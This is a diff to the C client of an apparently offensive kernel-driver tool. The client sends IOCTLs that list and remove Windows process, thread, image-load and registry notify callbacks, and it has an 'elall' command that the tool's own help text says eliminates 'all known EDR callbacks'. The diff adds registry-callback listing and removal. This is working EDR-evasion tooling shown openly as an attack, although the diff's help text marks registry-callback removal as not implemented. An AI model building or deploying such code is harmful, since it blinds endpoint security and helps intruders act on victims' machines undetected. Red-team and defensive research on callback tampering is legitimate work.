@@ -31,6 +31,8 @@ int stop_term_thread = 0;
 #define IOCTL_REM_THREAD_CALLBACK CTL_CODE_HIDE(5)
 #define IOCTL_LIST_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(6)
 #define IOCTL_REM_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(7)
+#define IOCTL_LIST_REG_CALLBACK CTL_CODE_HIDE(8)
+#define IOCTL_REM_REG_CALLBACK CTL_CODE_HIDE(9)
 
 
 #pragma warning (disable: 4996)
@@ -468,6 +470,40 @@ BOOL ListLoadImageNotifyRoutine(HANDLE hDevice) {
     return result;
 }
 
+BOOL ListRegCallBack(HANDLE hDevice) {
+    DWORD bytesReturned;
+    ModulesData* resultArray = NULL;
+    ULONG64 modulesCount = 0;
+    BOOL result;
+    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_LIST_REG_CALLBACK,
+        NULL,
+        0,
+        resultArray,
+        sizeof(ModulesData) * 64,
+        &bytesReturned,
+        NULL
+    );
+    //if (resultArray == NULL) {
+    //    fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
+    //    free(resultArray);
+    //    return FALSE;
+    //}
+    //if (bytesReturned == 0) {
+    //    fprintf(stderr, "No data returned from driver.\n");
+    //    free(resultArray);
+    //    return FALSE;
+    //}
+    //for (size_t i = 0; i < 64; i++) {
+    //    if (resultArray[i].ModuleBase == 0)
+    //        continue;
+    //    printf("Registry Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
+    //}
+    return result;
+}
+
 
 BOOL ElLoadImageCallback(HANDLE hDevice) {
     DWORD bytesReturned;
@@ -531,12 +567,37 @@ BOOL ElLoadImageCallback(HANDLE hDevice) {
         fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
     }
     else {
-        printf("Successfully sent request to remove loadImage notify routine callback.\n");
+        printf("Successfully removed loadImage notify routine callback.\n");
     }
     return result;
 }
 
 
+BOOL ElRegCallBack(HANDLE hDevice) {
+    DWORD bytesReturned;
+    ModulesData* resultArray = NULL;
+    ULONG64 modulesCount = 0;
+    BOOL result;
+
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_REM_REG_CALLBACK,
+        NULL,
+        0,
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully removed registry notify routine callback.\n");
+    }
+    return result;
+}
 
 int main(int argc, char* argv[])
 {
@@ -592,17 +653,24 @@ int main(int argc, char* argv[])
         else if (strncmp(input, "listproc", 8) == 0) {
             ListProcNotifyRoutine(hDevice);
         }
-		else if (strncmp(input, "elproccallback", 14) == 0) {
-			BOOL result = ElProcCallback(hDevice);
-		    if (result) {
+
+        else if (strncmp(input, "listthread", 10) == 0) {
+            ListThreadNotifyRoutine(hDevice);
+        }
+        else if (strncmp(input, "listloadimage", 13) == 0) {
+            ListLoadImageNotifyRoutine(hDevice);
+        }
+        else if (strncmp(input, "listreg", 7) == 0) {
+            ListRegCallBack(hDevice);
+		}
+        else if (strncmp(input, "elproccallback", 14) == 0) {
+            BOOL result = ElProcCallback(hDevice);
+            if (result) {
                 printf("Sent request to eliminate process notify routine callback.\n");
             }
             else {
                 printf("Failed to send request. Error: %lu\n", GetLastError());
-			}
-        }
-        else if (strncmp(input, "listthread", 10) == 0) {
-            ListThreadNotifyRoutine(hDevice);
+            }
         }
         else if (strncmp(input, "elthreadcallback", 16) == 0) {
             BOOL result = ElThreadCallback(hDevice);
@@ -613,9 +681,6 @@ int main(int argc, char* argv[])
                 printf("Failed to send request. Error: %lu\n", GetLastError());
             }
 		}
-        else if (strncmp(input, "listloadimage", 13) == 0) {
-            ListLoadImageNotifyRoutine(hDevice);
-		}
         else if (strncmp(input, "elloadimagecallback", 18) == 0) {
             BOOL result = ElLoadImageCallback(hDevice);
             if (result) {
@@ -625,11 +690,21 @@ int main(int argc, char* argv[])
                 printf("Failed to send request. Error: %lu\n", GetLastError());
             }
 		}
+        else if (strncmp(input, "elregcallback", 13) == 0) {
+            BOOL result = ElRegCallBack(hDevice);
+            if (result) {
+                printf("Sent request to eliminate registry notify routine callback.\n");
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+		}
         else if (strncmp(input, "elall", 5) == 0) {
             BOOL result1 = ElProcCallback(hDevice);
             BOOL result2 = ElThreadCallback(hDevice);
             BOOL result3 = ElLoadImageCallback(hDevice);
-            if (result1 && result2 && result3) {
+			BOOL result4 = ElRegCallBack(hDevice);
+            if (result1 && result2 && result3 && result4) {
                 printf("Sent requests to eliminate all known EDR callbacks.\n");
             }
             else {
@@ -645,9 +720,11 @@ int main(int argc, char* argv[])
             printf(" - listproc             - List process notify routines\n");
             printf(" - listthread           - List thread notify routines\n");
 			printf(" - listloadimage        - List load image notify routines\n");
+			printf(" - listreg              - List registry notify routines (only prints in KD)\n");
 			printf(" - elproccallback       - Eliminate process notify routine callback\n");
 			printf(" - elthreadcallback     - Eliminate thread notify routine callback\n");
 			printf(" - elloadimagecallback  - Eliminate load image notify routine callback\n");
+			printf(" - elregcallback        - Eliminate registry notify routine callback (not implemented)\n");
 
 			printf(" - elall                - Eliminate all known EDR callbacks\n");            
 			printf(" - help             - Show this help menu\n");
